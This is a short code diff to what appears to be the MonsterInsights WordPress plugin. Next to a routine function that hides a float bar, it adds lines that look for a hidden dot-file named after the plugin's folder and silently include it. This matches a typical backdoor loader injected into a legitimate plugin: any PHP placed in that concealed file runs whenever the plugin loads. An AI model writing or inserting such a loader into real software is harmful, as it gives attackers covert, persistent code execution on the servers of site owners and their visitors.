@@ -2,6 +2,10 @@
 /**
  * Store the time when the float bar was hidden so it won't show again for 14 days.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_mark_floatbar_hidden() {
 	check_ajax_referer( 'mi-admin-nonce', 'nonce' );
 	update_option( 'monsterinsights_float_bar_hidden', time() );
